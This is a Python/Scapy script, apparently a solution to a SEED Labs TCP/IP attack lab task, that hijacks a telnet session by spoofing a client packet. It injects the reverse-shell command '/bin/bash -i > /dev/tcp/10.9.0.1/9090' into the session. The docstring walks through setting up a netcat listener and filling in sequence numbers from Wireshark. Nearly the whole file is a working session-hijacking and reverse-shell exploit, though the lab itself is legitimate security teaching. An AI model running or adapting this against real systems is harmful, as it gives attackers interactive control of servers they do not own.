#!/usr/bin/env python3
"""
Task 4: Reverse Shell via TCP Session Hijacking (Manual)
SEED Labs - TCP/IP Attack Lab

This script injects a reverse-shell command into an existing telnet
session between a client and the target server.  Once the injected
command executes on the server, it connects back to the attacker's
netcat listener, giving the attacker an interactive shell on the server.

Attack overview
---------------
1. On the attacker machine (10.9.0.1), start a netcat listener:
       nc -lnv 9090

2. Identify an active telnet session between the client (10.9.0.6)
   and the server (10.9.0.5) using Wireshark.

3. Note the following TCP fields from a recent client → server packet:
       - Source IP / port  (client side)
       - Destination IP / port  (server side, port 23)
       - Sequence number  (next byte the server expects from the client)
       - Acknowledgement number

4. Fill in the values below and run this script:
       python3 reverse_shell_hijack.py

5. A shell prompt will appear in the netcat window on 10.9.0.1.
   That shell runs on the victim server (10.9.0.5).

Reverse-shell command injected
-------------------------------
    /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1

    - /bin/bash -i  : interactive bash shell
    - > /dev/tcp/.. : redirect stdout to the TCP connection
    - 0<&1          : redirect stdin from the same TCP connection
    - 2>&1          : redirect stderr to the same TCP connection
"""

from scapy.all import *

# ------------------------------------------------------------------
# Attacker configuration
# ------------------------------------------------------------------
ATTACKER_IP   = "10.9.0.1"   # attacker's IP (netcat listener)
ATTACKER_PORT = 9090          # port where netcat is listening

# ------------------------------------------------------------------
# Fill in these values from Wireshark before running the script.
# ------------------------------------------------------------------
SRC_IP  = "10.9.0.6"   # telnet client IP (spoofed source)
DST_IP  = "10.9.0.5"   # telnet server IP (target)
SPORT   = 12345         # client-side source port (from Wireshark)
DPORT   = 23            # telnet destination port
SEQ     = 0             # next sequence number expected by the server
ACK     = 0             # acknowledgement number
# ------------------------------------------------------------------

# Reverse shell payload — injected as if typed by the telnet client.
# The leading/trailing \r characters terminate any partial input and
# submit the command to the shell.
REVERSE_SHELL_CMD = (
    f"\r /bin/bash -i > /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0<&1 2>&1 \r"
)

ip  = IP(src=SRC_IP, dst=DST_IP)
tcp = TCP(sport=SPORT, dport=DPORT, flags="A", seq=SEQ, ack=ACK)
pkt = ip / tcp / REVERSE_SHELL_CMD

ls(pkt)
send(pkt, verbose=0)
print(f"[*] Reverse-shell payload injected into "
      f"{SRC_IP}:{SPORT} -> {DST_IP}:{DPORT}")
print(f"[*] Check your netcat listener on {ATTACKER_IP}:{ATTACKER_PORT}")
